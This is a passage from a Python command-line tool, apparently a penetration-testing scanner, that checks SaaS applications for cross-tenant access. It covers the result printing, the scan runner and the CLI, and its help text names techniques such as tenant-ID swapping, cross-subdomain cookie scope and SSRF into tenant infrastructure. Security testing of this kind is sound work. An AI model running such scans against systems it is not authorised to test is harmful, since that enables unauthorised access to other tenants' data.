    print(color("[*]", Cyber.CYAN), f"Current Tenant: {result.current_tenant}")
    print()

    if result.issues:
        print(color("[!]", Cyber.YELLOW, Cyber.BOLD), "Issues:")
        for issue in result.issues:
            print(color("    -", Cyber.YELLOW), issue)
        print()

    # Agrupa por categoria
    categories: dict[str, list[TenantAttempt]] = {}
    for attempt in result.attempts:
        categories.setdefault(attempt.category, []).append(attempt)

    for cat, attempts in categories.items():
        vuln_in_cat = [a for a in attempts if a.vulnerable]
        if vuln_in_cat:
            print(
                color("[!]", Cyber.RED, Cyber.BOLD),
                f"{cat}: {len(vuln_in_cat)} vulnerable(s)",
            )
            for a in vuln_in_cat:
                print(color("    [-]", Cyber.RED), f"{a.technique}: {a.details}")
                print_exploit_info(a.exploit, a.tool)
        else:
            print(color("[+]", Cyber.GREEN), f"{cat}: secure")

    print()
    if result.overall_status == "vulnerable":
        print(
            color("[!]", Cyber.RED, Cyber.BOLD),
            "VULNERABLE — Cross-tenant access detected!",
        )
    else:
        print(
            color("[+]", Cyber.GREEN, Cyber.BOLD),
            "SECURE — No cross-tenant access detected",
        )
    print()


# ─── Main Scan ───────────────────────────────────────────────────────────────


async def run_scan(
    target: str,
    categories: list[str] | None,
    timeout: float,
    output_file: str | None,
) -> TenantResult:
    """Executa scan multi-tenant."""
    tls = target.startswith("https")

    async with create_async_client(timeout=timeout) as client:
        # Baseline
        b_status, _b_headers, b_body, _b_raw = await fetch(
            client, target, timeout=timeout
        )
        b_size = len(b_body)
        current_tenant = _detect_current_tenant(b_body)

        # Testa categorias
        all_attempts: list[TenantAttempt] = []
        cats = categories if categories is not None else list(_CATEGORY_MAP.keys())

        for cat in cats:
            tester = _CATEGORY_TESTERS.get(cat)
            if tester is None:
                continue
            raw = await tester(client, target, timeout, b_status, b_size)
            all_attempts.extend(raw)

        # Classifica resultados
        vuln_techs = [a.technique for a in all_attempts if a.vulnerable]
        blocked_techs = [
            a.technique
            for a in all_attempts
            if not a.vulnerable
            and a.status_changed
            and a.status_test in (403, 401, 302)
        ]

        # Issues
        issues: list[str] = []
        if vuln_techs:
            issues.append(f"{len(vuln_techs)} techniques vulnerable")
        if blocked_techs:
            issues.append(f"{len(blocked_techs)} techniques blocked by auth")

        overall = "vulnerable" if vuln_techs else "secure"

        result = TenantResult(
            target=target,
            tls=tls,
            baseline_status=b_status,
            baseline_size=b_size,
            current_tenant=current_tenant,
            attempts=all_attempts,
            vulnerable_techniques=vuln_techs,
            blocked_techniques=blocked_techs,
            issues=issues,
            overall_status=overall,
        )

        print_results(result)

        if output_file:
            write_output(output_file, asdict(result))

        return result


# ─── CLI ─────────────────────────────────────────────────────────────────────


def build_parser() -> argparse.ArgumentParser:
    """Constrói parser de argumentos CLI."""
    parser = argparse.ArgumentParser(
        prog="mytools-multitenant",
        description="Multi-Tenant Security Testing — Testa isolamento entre tenants",
    )
    parser.add_argument("url", help="URL alvo para teste")
    parser.add_argument(
        "-c",
        "--categories",
        nargs="+",
        choices=list(_CATEGORY_MAP.keys()),
        help="Categorias para testar (default: todas)",
    )
    add_common_args(parser, "web")
    return parser


def run_once(args: argparse.Namespace) -> int:
    """Executa scan uma vez."""
    result = safe_asyncio_run(
        run_scan(
            target=args.url,
            categories=getattr(args, "categories", None),
            timeout=getattr(args, "timeout", 10.0),
            output_file=getattr(args, "output", None),
        )
    )
    return 1 if result.overall_status == "vulnerable" else 0


def main() -> int:
    """Entry point principal."""
    return run_main_loop(
        parser=build_parser(),
        banner_fn=create_banner(_BANNER_LINES, "Multi-Tenant Security Test"),
        run_fn=run_once,
        has_target=lambda a: bool(getattr(a, "url", None)),
        prompt="multitenant> ",
        description="Teste de isolamento entre tenants em aplicações SaaS.",
        example="https://app.example.com/api/v1/users -c tenant_id",
        contextual_help=(
            "Categorias disponíveis:\n"
            "  tenant_id            — Trocar tenant ID em headers/cookies/params\n"
            "  subdomain_isolation  — Cookie scope cross-subdomain\n"
            "  shared_resource      — Acessar recursos de outros tenants\n"
            "  cross_tenant_ssrf    — SSRF para infra interna de tenants"
        ),
    )


if __name__ == "__main__":
    raise SystemExit(main())
